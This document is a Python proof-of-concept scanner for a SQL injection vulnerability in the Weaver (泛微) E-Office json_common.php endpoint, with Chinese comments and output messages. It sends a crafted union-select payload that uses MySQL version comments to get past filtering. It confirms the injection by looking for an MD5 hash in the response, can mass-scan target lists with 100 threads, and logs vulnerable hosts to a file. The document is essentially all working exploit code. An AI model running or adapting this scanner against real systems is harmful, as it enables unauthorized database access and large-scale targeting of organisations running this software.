#泛微E-Office json_common.php SQL注入漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="泛微E-Office json_common.php SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
def poc(target):
    payload_url = "/building/json_common.php "
    url = target+payload_url
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Content-Length": "81",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "gzip, deflate"
    }
    data = 'tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,MD5(1) ,4#|2|333'
    # proxies = {
    #      'http':'http://127.0.0.1:8080',
    #      'https':'http://127.0.0.1:8080'
    # }

    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        else:
            print(f"该url不存在漏洞{target}")
    except Exception as e:
        print(f"该url存在问题{target}"+e)
if __name__ == '__main__':
    main()